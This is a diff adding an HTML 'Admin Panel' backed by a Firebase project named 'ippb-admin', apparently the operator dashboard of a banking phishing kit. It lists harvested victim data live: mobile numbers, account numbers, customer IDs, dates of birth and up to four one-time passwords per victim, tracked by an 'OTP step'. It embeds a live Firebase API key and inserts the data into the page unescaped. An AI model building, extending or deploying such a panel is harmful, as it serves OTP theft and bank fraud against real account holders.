@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Admin Panel</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body{margin:0;font-family:Arial;background:#f2f2f2}
+.header{background:#4b1026;color:#fff;padding:14px;text-align:center;font-size:18px;font-weight:bold}
+.stats{padding:10px;background:#fff;border-bottom:1px solid #ddd;font-size:14px}
+
+/* CARD */
+.card{
+  background:#fff;
+  margin:12px;
+  padding:14px;
+  border-radius:14px;
+  border-left:5px solid #4CAF50;
+  box-shadow:0 6px 12px rgba(0,0,0,.08);
+}
+.card.pinned{
+  border-left:5px solid #d4af37;
+  background:linear-gradient(135deg,#fff6cc,#fff);
+}
+
+.top{display:flex;justify-content:space-between;align-items:center}
+.user-title{font-weight:bold;font-size:15px}
+.step{font-size:12px;background:#eee;padding:3px 10px;border-radius:12px}
+
+.detail{font-size:13px;color:#444;margin-top:4px}
+
+.otp-box{
+  margin-top:10px;
+  padding:10px;
+  border:1px dashed #ccc;
+  border-radius:10px;
+  font-size:13px;
+  background:#fafafa;
+}
+
+.actions{display:flex;gap:12px;margin-top:12px}
+.btn{
+  font-size:13px;
+  padding:6px 14px;
+  border-radius:8px;
+  cursor:pointer;
+  user-select:none;
+}
+.pin{background:#fff3cd;color:#856404}
+.del{background:#f8d7da;color:#721c24}
+</style>
+</head>
+
+<body>
+
+<div class="header">Admin Panel (Live)</div>
+<div class="stats" id="count">Total Users: 0</div>
+<div id="list"></div>
+
+<!-- FIREBASE -->
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+<script>
+/* 🔥 FIREBASE INIT */
+firebase.initializeApp({
+  apiKey:"AIzaSyAGxv4B-TBWs-yxFVgWVZ8XHJfNRj18B9E",
+  authDomain:"ippb-admin-1e21b.firebaseapp.com",
+  databaseURL:"https://ippb-admin-1e21b-default-rtdb.firebaseio.com",
+  projectId:"ippb-admin-1e21b"
+});
+
+const db = firebase.database();
+const list = document.getElementById("list");
+const countEl = document.getElementById("count");
+
+/* 🔴 DELETE FUNCTION (FIXED) */
+function deleteUser(userId){
+  const ok = confirm("Are you sure you want to delete this user?");
+  if(!ok) return;
+
+  db.ref("users").child(userId).remove()
+    .then(()=>console.log("Deleted:", userId))
+    .catch(err=>alert("Delete Error"));
+}
+
+/* 📌 PIN / UNPIN */
+function togglePin(userId, val){
+  db.ref("users").child(userId).update({ pinned: val });
+}
+
+/* 🔁 LIVE LIST */
+db.ref("users").on("value", snap=>{
+  const data = snap.val() || {};
+  const keys = Object.keys(data);
+
+  countEl.innerText = "Total Users: " + keys.length;
+  list.innerHTML = "";
+
+  let users = keys.map(k => ({ id:k, ...data[k] }));
+
+  /* PINNED FIRST */
+  users.sort((a,b)=>{
+    if(a.pinned && !b.pinned) return -1;
+    if(!a.pinned && b.pinned) return 1;
+    return (b.time||0) - (a.time||0);
+  });
+
+  users.forEach((u,i)=>{
+    const card = document.createElement("div");
+    card.className = "card" + (u.pinned ? " pinned" : "");
+
+    card.innerHTML = `
+      <div class="top">
+        <div class="user-title">User ${i+1}</div>
+        <div class="step">STEP ${u.otpStep || 0}</div>
+      </div>
+
+      <div class="detail">Mobile: ${u.mobile || "-"}</div>
+      <div class="detail">Account: ${u.account || "-"}</div>
+      <div class="detail">Customer ID: ${u.customerId || "-"}</div>
+      <div class="detail">DOB: ${u.dob || "-"}</div>
+
+      <div class="otp-box">
+        <div>OTP 1: ${u.otp1 || "-"}</div>
+        <div>OTP 2: ${u.otp2 || "-"}</div>
+        <div>OTP 3: ${u.otp3 || "-"}</div>
+        <div>OTP 4: ${u.otp4 || "-"}</div>
+      </div>
+
+      <div class="actions">
+        <div class="btn pin" onclick="togglePin('${u.id}', ${u.pinned?0:1})">
+          ${u.pinned ? "Unpin" : "Pin"}
+        </div>
+        <div class="btn del" onclick="deleteUser('${u.id}')">
+          Delete
+        </div>
+      </div>
+    `;
+
+    list.appendChild(card);
+  });
+});
+</script>
+
+</body>
+</html>
